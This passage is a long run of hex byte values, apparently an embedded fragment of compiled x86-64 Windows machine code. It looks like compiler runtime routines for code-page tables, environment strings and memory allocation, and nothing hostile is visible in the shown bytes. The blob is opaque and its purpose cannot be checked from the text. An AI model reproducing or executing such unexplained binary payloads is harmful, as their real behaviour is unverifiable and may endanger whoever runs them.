0x48, 0x8d, 0x45, 0x70, 0x89, 0x5c, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28, 0x89, 0x5c, 0x24, 0x20, 0xe8, 0xf6, 0x31, 0x0, 0x0, 0x83, 0x64, 0x24, 0x40, 0x0, 0x4c, 0x8d, 0x4c, 0x24, 0x70, 0x8b, 0x47, 0x4, 0x41, 0xb8, 0x0, 0x2, 0x0, 0x0, 0x48, 0x8b, 0x97, 0x20, 0x2, 0x0, 0x0, 0x33, 0xc9, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8d, 0x85, 0x70, 0x1, 0x0, 0x0, 0x89, 0x5c, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28, 0x89, 0x5c, 0x24, 0x20, 0xe8, 0xbd, 0x31, 0x0, 0x0, 0x4c, 0x8d, 0x45, 0x70, 0x4c, 0x2b, 0xc7, 0x4c, 0x8d, 0x8d, 0x70, 0x1, 0x0, 0x0, 0x4c, 0x2b, 0xcf, 0x48, 0x8d, 0x95, 0x70, 0x2, 0x0, 0x0, 0x48, 0x8d, 0x47, 0x19, 0xf6, 0x2, 0x1, 0x74, 0xa, 0x80, 0x8, 0x10, 0x41, 0x8a, 0x4c, 0x0, 0xe7, 0xeb, 0x11, 0xf6, 0x2, 0x2, 0x74, 0xa, 0x80, 0x8, 0x20, 0x41, 0x8a, 0x4c, 0x1, 0xe7, 0xeb, 0x2, 0x32, 0xc9, 0x88, 0x88, 0x0, 0x1, 0x0, 0x0, 0x48, 0x83, 0xc2, 0x2, 0x48, 0xff, 0xc0, 0x48, 0x83, 0xeb, 0x1, 0x75, 0xcd, 0xeb, 0x3f, 0x33, 0xd2, 0x48, 0x8d, 0x4f, 0x19, 0xbb, 0x0, 0x1, 0x0, 0x0, 0x44, 0x8d, 0x42, 0x9f, 0x41, 0x8d, 0x40, 0x20, 0x83, 0xf8, 0x19, 0x77, 0x8, 0x80, 0x9, 0x10, 0x8d, 0x42, 0x20, 0xeb, 0x10, 0x41, 0x83, 0xf8, 0x19, 0x77, 0x8, 0x80, 0x9, 0x20, 0x8d, 0x42, 0xe0, 0xeb, 0x2, 0x32, 0xc0, 0x88, 0x81, 0x0, 0x1, 0x0, 0x0, 0xff, 0xc2, 0x48, 0xff, 0xc1, 0x3b, 0xd3, 0x72, 0xcc, 0x48, 0x8b, 0x8d, 0x70, 0x6, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x7e, 0x61, 0x0, 0x0, 0x4c, 0x8d, 0x9c, 0x24, 0x80, 0x7, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x18, 0x49, 0x8b, 0x7b, 0x20, 0x49, 0x8b, 0xe3, 0x5d, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x70, 0x10, 0x4c, 0x89, 0x48, 0x20, 0x4c, 0x89, 0x40, 0x18, 0x55, 0x57, 0x41, 0x56, 0x48, 0x8d, 0xa8, 0x78, 0xfe, 0xff, 0xff, 0x48, 0x81, 0xec, 0x70, 0x2, 0x0, 0x0, 0x44, 0x8a, 0xf2, 0x8b, 0xd9, 0x49, 0x8b, 0xd1, 0x49, 0x8b, 0xc8, 0xe8, 0x3b, 0x2, 0x0, 0x0, 0x8b, 0xcb, 0xe8, 0xc4, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0x8d, 0xa0, 0x1, 0x0, 0x0, 0x8b, 0xf8, 0x4c, 0x8b, 0x81, 0x88, 0x0, 0x0, 0x0, 0x41, 0x3b, 0x40, 0x4, 0x75, 0x7, 0x33, 0xc0, 0xe9, 0xfe, 0x1, 0x0, 0x0, 0xb9, 0x28, 0x2, 0x0, 0x0, 0xe8, 0x45, 0x1a, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0xf, 0x33, 0xc9, 0xe8, 0x66, 0xed, 0xff, 0xff, 0x83, 0xc8, 0xff, 0xe9, 0xdd, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x40, 0xba, 0x4, 0x0, 0x0, 0x0, 0x44, 0x8b, 0xc2, 0x48, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x44, 0x8d, 0x4a, 0x7c, 0xf, 0x10, 0x0, 0xf, 0x10, 0x48, 0x10, 0xf, 0x11, 0x1, 0xf, 0x10, 0x40, 0x20, 0xf, 0x11, 0x49, 0x10, 0xf, 0x10, 0x48, 0x30, 0xf, 0x11, 0x41, 0x20, 0xf, 0x10, 0x40, 0x40, 0xf, 0x11, 0x49, 0x30, 0xf, 0x10, 0x48, 0x50, 0xf, 0x11, 0x41, 0x40, 0xf, 0x10, 0x40, 0x60, 0xf, 0x11, 0x49, 0x50, 0xf, 0x10, 0x48, 0x70, 0x49, 0x3, 0xc1, 0xf, 0x11, 0x41, 0x60, 0x49, 0x3, 0xc9, 0xf, 0x11, 0x49, 0xf0, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xb6, 0xf, 0x10, 0x0, 0xf, 0x10, 0x48, 0x10, 0x48, 0x8b, 0x40, 0x20, 0xf, 0x11, 0x1, 0xf, 0x11, 0x49, 0x10, 0x48, 0x89, 0x41, 0x20, 0x48, 0x8b, 0xcb, 0x48, 0x8d, 0x44, 0x24, 0x40, 0xf, 0x10, 0x0, 0xf, 0x10, 0x48, 0x10, 0xf, 0x11, 0x1, 0xf, 0x10, 0x40, 0x20, 0xf, 0x11, 0x49, 0x10, 0xf, 0x10, 0x48, 0x30, 0xf, 0x11, 0x41, 0x20, 0xf, 0x10, 0x40, 0x40, 0xf, 0x11, 0x49, 0x30, 0xf, 0x10, 0x48, 0x50, 0xf, 0x11, 0x41, 0x40, 0xf, 0x10, 0x40, 0x60, 0xf, 0x11, 0x49, 0x50, 0xf, 0x10, 0x48, 0x70, 0x49, 0x3, 0xc1, 0xf, 0x11, 0x41, 0x60, 0x49, 0x3, 0xc9, 0xf, 0x11, 0x49, 0xf0, 0x48, 0x83, 0xea, 0x1, 0x75, 0xb6, 0xf, 0x10, 0x0, 0xf, 0x10, 0x48, 0x10, 0x48, 0x8b, 0x40, 0x20, 0xf, 0x11, 0x1, 0xf, 0x11, 0x49, 0x10, 0x48, 0x89, 0x41, 0x20, 0x8b, 0xcf, 0x21, 0x13, 0x48, 0x8b, 0xd3, 0xe8, 0x37, 0x2, 0x0, 0x0, 0x83, 0xcf, 0xff, 0x8b, 0xf0, 0x3b, 0xc7, 0x75, 0x1a, 0xe8, 0xc5, 0xeb, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x4f, 0xec, 0xff, 0xff, 0x8b, 0xc7, 0xe9, 0xc7, 0x0, 0x0, 0x0, 0x45, 0x84, 0xf6, 0x75, 0x5, 0xe8, 0x56, 0x1c, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x88, 0x88, 0x0, 0x0, 0x0, 0x8b, 0xc7, 0xf0, 0xf, 0xc1, 0x1, 0x3, 0xc7, 0x75, 0x1f, 0x48, 0x8b, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x88, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x5, 0x81, 0x11, 0x1, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0x5, 0xe8, 0x7, 0xec, 0xff, 0xff, 0xc7, 0x3, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x48, 0x89, 0x98, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x8b, 0x88, 0xa8, 0x3, 0x0, 0x0, 0x85, 0xd, 0x8, 0x19, 0x1, 0x0, 0x75, 0x54, 0x48, 0x8d, 0x85, 0xa0, 0x1, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4c, 0x24, 0x24, 0x48, 0x8d, 0x85, 0xa8, 0x1, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0xb8, 0x5, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0x89, 0x44, 0x24, 0x24, 0x89, 0x44, 0x24, 0x28, 0xe8, 0xf8, 0xf8, 0xff, 0xff, 0x45, 0x84, 0xf6, 0x74, 0x11, 0x48, 0x8b, 0x85, 0xa8, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x8, 0x48, 0x89, 0xd, 0x9a, 0x17, 0x1, 0x0, 0x33, 0xc9, 0xe8, 0x83, 0xeb, 0xff, 0xff, 0x8b, 0xc6, 0x4c, 0x8d, 0x9c, 0x24, 0x70, 0x2, 0x0, 0x0, 0x49, 0x8b, 0x5b, 0x20, 0x49, 0x8b, 0x73, 0x28, 0x49, 0x8b, 0xe3, 0x41, 0x5e, 0x5f, 0x5d, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x8b, 0x5, 0x75, 0x18, 0x1, 0x0, 0x85, 0x81, 0xa8, 0x3, 0x0, 0x0, 0x74, 0x13, 0x48, 0x83, 0xb9, 0x90, 0x0, 0x0, 0x0, 0x0, 0x74, 0x9, 0x48, 0x8b, 0x99, 0x88, 0x0, 0x0, 0x0, 0xeb, 0x64, 0xb9, 0x5, 0x0, 0x0, 0x0, 0xe8, 0x20, 0xe5, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x9f, 0x88, 0x0, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x30, 0x48, 0x3b, 0x1e, 0x74, 0x3e, 0x48, 0x85, 0xdb, 0x74, 0x22, 0x83, 0xc8, 0xff, 0xf0, 0xf, 0xc1, 0x3, 0x83, 0xf8, 0x1, 0x75, 0x16, 0x48, 0x8d, 0x5, 0x6e, 0x10, 0x1, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x3b, 0xc8, 0x74, 0x5, 0xe8, 0xef, 0xea, 0xff, 0xff, 0x48, 0x8b, 0x6, 0x48, 0x89, 0x87, 0x88, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x30, 0xf0, 0xff, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0xb9, 0x5, 0x0, 0x0, 0x0, 0xe8, 0x1a, 0xe5, 0xff, 0xff, 0x48, 0x85, 0xdb, 0x74, 0x13, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x35, 0xdb, 0xff, 0xff, 0x90, 0x48, 0x83, 0xec, 0x28, 0x80, 0x3d, 0xe1, 0x1f, 0x1, 0x0, 0x0, 0x75, 0x4c, 0x48, 0x8d, 0xd, 0x4c, 0x13, 0x1, 0x0, 0x48, 0x89, 0xd, 0xbd, 0x1f, 0x1, 0x0, 0x48, 0x8d, 0x5, 0xfe, 0xf, 0x1, 0x0, 0x48, 0x8d, 0xd, 0x27, 0x12, 0x1, 0x0, 0x48, 0x89, 0x5, 0xb0, 0x1f, 0x1, 0x0, 0x48, 0x89, 0xd, 0x99, 0x1f, 0x1, 0x0, 0xe8, 0x98, 0xe1, 0xff, 0xff, 0x4c, 0x8d, 0xd, 0x9d, 0x1f, 0x1, 0x0, 0x4c, 0x8b, 0xc0, 0xb2, 0x1, 0xb9, 0xfd, 0xff, 0xff, 0xff, 0xe8, 0x86, 0xfc, 0xff, 0xff, 0xc6, 0x5, 0x93, 0x1f, 0x1, 0x0, 0x1, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x97, 0xe0, 0xff, 0xff, 0x48, 0x8d, 0x15, 0x70, 0x1f, 0x1, 0x0, 0x48, 0x8b, 0xc8, 0x48, 0x83, 0xc4, 0x28, 0xe9, 0xcc, 0xfe, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x6c, 0x24, 0x20, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x5, 0x37, 0xf, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8b, 0xf2, 0xe8, 0x2f, 0xf9, 0xff, 0xff, 0x33, 0xdb, 0x8b, 0xf8, 0x85, 0xc0, 0xf, 0x84, 0x54, 0x2, 0x0, 0x0, 0x4c, 0x8d, 0x25, 0xb4, 0x13, 0x1, 0x0, 0x44, 0x8b, 0xf3, 0x49, 0x8b, 0xc4, 0x8d, 0x6b, 0x1, 0x39, 0x38, 0xf, 0x84, 0x4e, 0x1, 0x0, 0x0, 0x44, 0x3, 0xf5, 0x48, 0x83, 0xc0, 0x30, 0x41, 0x83, 0xfe, 0x5, 0x72, 0xeb, 0x81, 0xff, 0xe8, 0xfd, 0x0, 0x0, 0xf, 0x84, 0x2d, 0x1, 0x0, 0x0, 0xf, 0xb7, 0xcf, 0xff, 0x15, 0x61, 0x6f, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0x1c, 0x1, 0x0, 0x0, 0xb8, 0xe9, 0xfd, 0x0, 0x0, 0x3b, 0xf8, 0x75, 0x2e, 0x48, 0x89, 0x46, 0x4, 0x48, 0x89, 0x9e, 0x20, 0x2, 0x0, 0x0, 0x89, 0x5e, 0x18, 0x66, 0x89, 0x5e, 0x1c, 0x48, 0x8d, 0x7e, 0xc, 0xf, 0xb7, 0xc3, 0xb9, 0x6, 0x0, 0x0, 0x0, 0x66, 0xf3, 0xab, 0x48, 0x8b, 0xce, 0xe8, 0xc7, 0xf9, 0xff, 0xff, 0xe9, 0xe3, 0x1, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x8b, 0xcf, 0xff, 0x15, 0x2d, 0x6f, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x84, 0xc4, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x4e, 0x18, 0x33, 0xd2, 0x41, 0xb8, 0x1, 0x1, 0x0, 0x0, 0xe8, 0x8c, 0xa5, 0xff, 0xff, 0x83, 0x7c, 0x24, 0x20, 0x2, 0x89, 0x7e, 0x4, 0x48, 0x89, 0x9e, 0x20, 0x2, 0x0, 0x0, 0xf, 0x85, 0x94, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x26, 0x38, 0x5c, 0x24, 0x26, 0x74, 0x2c, 0x38, 0x59, 0x1, 0x74, 0x27, 0xf, 0xb6, 0x41, 0x1, 0xf, 0xb6, 0x11, 0x3b, 0xd0, 0x77, 0x14, 0x2b, 0xc2, 0x8d, 0x7a, 0x1, 0x8d, 0x14, 0x28, 0x80, 0x4c, 0x37, 0x18, 0x4, 0x3, 0xfd, 0x48, 0x2b, 0xd5, 0x75, 0xf4, 0x48, 0x83, 0xc1, 0x2, 0x38, 0x19, 0x75, 0xd4, 0x48, 0x8d, 0x46, 0x1a, 0xb9, 0xfe, 0x0, 0x0, 0x0, 0x80, 0x8, 0x8, 0x48, 0x3, 0xc5, 0x48, 0x2b, 0xcd, 0x75, 0xf5, 0x8b, 0x4e, 0x4, 0x81, 0xe9, 0xa4, 0x3, 0x0, 0x0, 0x74, 0x2e, 0x83, 0xe9, 0x4, 0x74, 0x20, 0x83, 0xe9, 0xd, 0x74, 0x12, 0x3b, 0xcd, 0x74, 0x5, 0x48, 0x8b, 0xc3, 0xeb, 0x22, 0x48, 0x8b, 0x5, 0x47, 0x84, 0x0, 0x0, 0xeb, 0x19, 0x48, 0x8b, 0x5, 0x36, 0x84, 0x0, 0x0, 0xeb, 0x10, 0x48, 0x8b, 0x5, 0x25, 0x84, 0x0, 0x0, 0xeb, 0x7, 0x48, 0x8b, 0x5, 0x14, 0x84, 0x0, 0x0, 0x48, 0x89, 0x86, 0x20, 0x2, 0x0, 0x0, 0xeb, 0x2, 0x8b, 0xeb, 0x89, 0x6e, 0x8, 0xe9, 0xb, 0xff, 0xff, 0xff, 0x39, 0x1d, 0xdb, 0x1d, 0x1, 0x0, 0xf, 0x85, 0xf6, 0x0, 0x0, 0x0, 0x83, 0xc8, 0xff, 0xe9, 0xf8, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x4e, 0x18, 0x33, 0xd2, 0x41, 0xb8, 0x1, 0x1, 0x0, 0x0, 0xe8, 0xb4, 0xa4, 0xff, 0xff, 0x41, 0x8b, 0xc6, 0x4d, 0x8d, 0x4c, 0x24, 0x10, 0x4c, 0x8d, 0x3d, 0x25, 0x12, 0x1, 0x0, 0x41, 0xbe, 0x4, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x1c, 0x40, 0x49, 0xc1, 0xe3, 0x4, 0x4d, 0x3, 0xcb, 0x49, 0x8b, 0xd1, 0x41, 0x38, 0x19, 0x74, 0x3e, 0x38, 0x5a, 0x1, 0x74, 0x39, 0x44, 0xf, 0xb6, 0x2, 0xf, 0xb6, 0x42, 0x1, 0x44, 0x3b, 0xc0, 0x77, 0x24, 0x45, 0x8d, 0x50, 0x1, 0x41, 0x81, 0xfa, 0x1, 0x1, 0x0, 0x0, 0x73, 0x17, 0x41, 0x8a, 0x7, 0x44, 0x3, 0xc5, 0x41, 0x8, 0x44, 0x32, 0x18, 0x44, 0x3, 0xd5, 0xf, 0xb6, 0x42, 0x1, 0x44, 0x3b, 0xc0, 0x76, 0xe0, 0x48, 0x83, 0xc2, 0x2, 0x38, 0x1a, 0x75, 0xc2, 0x49, 0x83, 0xc1, 0x8, 0x4c, 0x3, 0xfd, 0x4c, 0x2b, 0xf5, 0x75, 0xae, 0x89, 0x7e, 0x4, 0x89, 0x6e, 0x8, 0x81, 0xef, 0xa4, 0x3, 0x0, 0x0, 0x74, 0x29, 0x83, 0xef, 0x4, 0x74, 0x1b, 0x83, 0xef, 0xd, 0x74, 0xd, 0x3b, 0xfd, 0x75, 0x22, 0x48, 0x8b, 0x1d, 0x5f, 0x83, 0x0, 0x0, 0xeb, 0x19, 0x48, 0x8b, 0x1d, 0x4e, 0x83, 0x0, 0x0, 0xeb, 0x10, 0x48, 0x8b, 0x1d, 0x3d, 0x83, 0x0, 0x0, 0xeb, 0x7, 0x48, 0x8b, 0x1d, 0x2c, 0x83, 0x0, 0x0, 0x4c, 0x2b, 0xde, 0x48, 0x89, 0x9e, 0x20, 0x2, 0x0, 0x0, 0x48, 0x8d, 0x56, 0xc, 0xb9, 0x6, 0x0, 0x0, 0x0, 0x4b, 0x8d, 0x3c, 0x23, 0xf, 0xb7, 0x44, 0x17, 0xf8, 0x66, 0x89, 0x2, 0x48, 0x8d, 0x52, 0x2, 0x48, 0x2b, 0xcd, 0x75, 0xef, 0xe9, 0x18, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0xce, 0xe8, 0x47, 0xf7, 0xff, 0xff, 0x33, 0xc0, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x33, 0xcc, 0xe8, 0x20, 0x5b, 0x0, 0x0, 0x4c, 0x8d, 0x5c, 0x24, 0x40, 0x49, 0x8b, 0x5b, 0x40, 0x49, 0x8b, 0x6b, 0x48, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c, 0x5f, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x40, 0x8b, 0xda, 0x41, 0x8b, 0xf9, 0x48, 0x8b, 0xd1, 0x41, 0x8b, 0xf0, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0xc4, 0xf1, 0xff, 0xff, 0x48, 0x8b, 0x44, 0x24, 0x30, 0xf, 0xb6, 0xd3, 0x40, 0x84, 0x7c, 0x2, 0x19, 0x75, 0x18, 0x85, 0xf6, 0x74, 0x10, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x8, 0xf, 0xb7, 0x4, 0x51, 0x85, 0xc6, 0x75, 0x4, 0x33, 0xc0, 0xeb, 0x5, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x80, 0x7c, 0x24, 0x38, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0x83, 0xa1, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x74, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0x8b, 0xd1, 0x41, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0xe9, 0x7a, 0xff, 0xff, 0xff, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xff, 0x15, 0xa2, 0x6c, 0x0, 0x0, 0x48, 0x89, 0x5, 0x3b, 0x1c, 0x1, 0x0, 0xff, 0x15, 0x9d, 0x6c, 0x0, 0x0, 0x48, 0x89, 0x5, 0x36, 0x1c, 0x1, 0x0, 0xb0, 0x1, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x81, 0xf9, 0x35, 0xc4, 0x0, 0x0, 0x77, 0x20, 0x8d, 0x81, 0xd4, 0x3b, 0xff, 0xff, 0x83, 0xf8, 0x9, 0x77, 0xc, 0x41, 0xba, 0xa7, 0x2, 0x0, 0x0, 0x41, 0xf, 0xa3, 0xc2, 0x72, 0x5, 0x83, 0xf9, 0x2a, 0x75, 0x2f, 0x33, 0xd2, 0xeb, 0x2b, 0x81, 0xf9, 0x98, 0xd6, 0x0, 0x0, 0x74, 0x20, 0x81, 0xf9, 0xa9, 0xde, 0x0, 0x0, 0x76, 0x1b, 0x81, 0xf9, 0xb3, 0xde, 0x0, 0x0, 0x76, 0xe4, 0x81, 0xf9, 0xe8, 0xfd, 0x0, 0x0, 0x74, 0xdc, 0x81, 0xf9, 0xe9, 0xfd, 0x0, 0x0, 0x75, 0x3, 0x83, 0xe2, 0x8, 0x48, 0xff, 0x25, 0x3a, 0x6c, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x8d, 0x81, 0x18, 0x2, 0xff, 0xff, 0x45, 0x8b, 0xd9, 0x83, 0xf8, 0x1, 0x49, 0x8b, 0xd8, 0x41, 0xf, 0x96, 0xc2, 0x33, 0xff, 0x81, 0xf9, 0x35, 0xc4, 0x0, 0x0, 0x77, 0x1c, 0x8d, 0x81, 0xd4, 0x3b, 0xff, 0xff, 0x83, 0xf8, 0x9, 0x77, 0xc, 0x41, 0xb8, 0xa7, 0x2, 0x0, 0x0, 0x41, 0xf, 0xa3, 0xc0, 0x72, 0x33, 0x83, 0xf9, 0x2a, 0xeb, 0x26, 0x81, 0xf9, 0x98, 0xd6, 0x0, 0x0, 0x74, 0x26, 0x81, 0xf9, 0xa9, 0xde, 0x0, 0x0, 0x76, 0x18, 0x81, 0xf9, 0xb3, 0xde, 0x0, 0x0, 0x76, 0x16, 0x81, 0xf9, 0xe8, 0xfd, 0x0, 0x0, 0x74, 0xe, 0x81, 0xf9, 0xe9, 0xfd, 0x0, 0x0, 0x74, 0x6, 0xf, 0xba, 0xf2, 0x7, 0xeb, 0x2, 0x8b, 0xd7, 0x48, 0x8b, 0x44, 0x24, 0x48, 0x45, 0x84, 0xd2, 0x4c, 0x8b, 0x4c, 0x24, 0x40, 0x4c, 0x8b, 0xc0, 0x4c, 0xf, 0x45, 0xc7, 0x4c, 0xf, 0x45, 0xcf, 0x74, 0x7, 0x48, 0x85, 0xc0, 0x74, 0x2, 0x89, 0x38, 0x4c, 0x89, 0x44, 0x24, 0x48, 0x4c, 0x8b, 0xc3, 0x4c, 0x89, 0x4c, 0x24, 0x40, 0x45, 0x8b, 0xcb, 0x48, 0x8b, 0x5c, 0x24, 0x10, 0x5f, 0x48, 0xff, 0x25, 0x93, 0x6b, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x40, 0xff, 0x15, 0x79, 0x6b, 0x0, 0x0, 0x33, 0xf6, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x7, 0x33, 0xc0, 0xe9, 0xc3, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xeb, 0x66, 0x39, 0x30, 0x74, 0x1d, 0x48, 0x83, 0xc8, 0xff, 0x48, 0xff, 0xc0, 0x66, 0x39, 0x74, 0x45, 0x0, 0x75, 0xf6, 0x48, 0x8d, 0x6c, 0x45, 0x0, 0x48, 0x83, 0xc5, 0x2, 0x66, 0x39, 0x75, 0x0, 0x75, 0xe3, 0x48, 0x89, 0x74, 0x24, 0x38, 0x48, 0x2b, 0xeb, 0x48, 0x89, 0x74, 0x24, 0x30, 0x48, 0x83, 0xc5, 0x2, 0x48, 0xd1, 0xfd, 0x4c, 0x8b, 0xc3, 0x44, 0x8b, 0xcd, 0x89, 0x74, 0x24, 0x28, 0x33, 0xd2, 0x48, 0x89, 0x74, 0x24, 0x20, 0x33, 0xc9, 0xe8, 0xcf, 0xfe, 0xff, 0xff, 0x4c, 0x63, 0xf0, 0x85, 0xc0, 0x75, 0xb, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xf, 0x6b, 0x0, 0x0, 0xeb, 0x96, 0x49, 0x8b, 0xce, 0xe8, 0xed, 0x11, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x33, 0xc9, 0xe8, 0xe, 0xe5, 0xff, 0xff, 0xeb, 0xdc, 0x48, 0x89, 0x74, 0x24, 0x38, 0x44, 0x8b, 0xcd, 0x48, 0x89, 0x74, 0x24, 0x30, 0x4c, 0x8b, 0xc3, 0x44, 0x89, 0x74, 0x24, 0x28, 0x33, 0xd2, 0x33, 0xc9, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x81, 0xfe, 0xff, 0xff, 0x85, 0xc0, 0x75, 0xa, 0x48, 0x8b, 0xcf, 0xe8, 0xdd, 0xe4, 0xff, 0xff, 0xeb, 0xa, 0x33, 0xc9, 0xe8, 0xd4, 0xe4, 0xff, 0xff, 0x48, 0x8b, 0xf7, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xb0, 0x6a, 0x0, 0x0, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x8b, 0x7c, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xe8, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf1, 0x48, 0x85, 0xd2, 0x74, 0x1d, 0x33, 0xd2, 0x48, 0x8d, 0x42, 0xe0, 0x48, 0xf7, 0xf3, 0x49, 0x3b, 0xc0, 0x73, 0xf, 0xe8, 0xdb, 0xe3, 0xff, 0xff, 0xc7, 0x0, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc0, 0xeb, 0x41, 0x48, 0x85, 0xf6, 0x74, 0xa, 0xe8, 0x3f, 0x28, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0xeb, 0x2, 0x33, 0xff, 0x48, 0xf, 0xaf, 0xdd, 0x48, 0x8b, 0xce, 0x48, 0x8b, 0xd3, 0xe8, 0x65, 0x28, 0x0, 0x0, 0x48, 0x8b, 0xf0, 0x48, 0x85, 0xc0, 0x74, 0x16, 0x48, 0x3b, 0xfb, 0x73, 0x11, 0x48, 0x2b, 0xdf, 0x48, 0x8d, 0xc, 0x38, 0x4c, 0x8b, 0xc3, 0x33, 0xd2, 0xe8, 0x5b, 0xa0, 0xff, 0xff, 0x48, 0x8b, 0xc6, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x44, 0x8b, 0xf9, 0x4c, 0x8d, 0x35, 0xca, 0x77, 0xff, 0xff, 0x4d, 0x8b, 0xe1, 0x49, 0x8b, 0xe8, 0x4c, 0x8b, 0xea, 0x4b, 0x8b, 0x8c, 0xfe, 0x30, 0xa2, 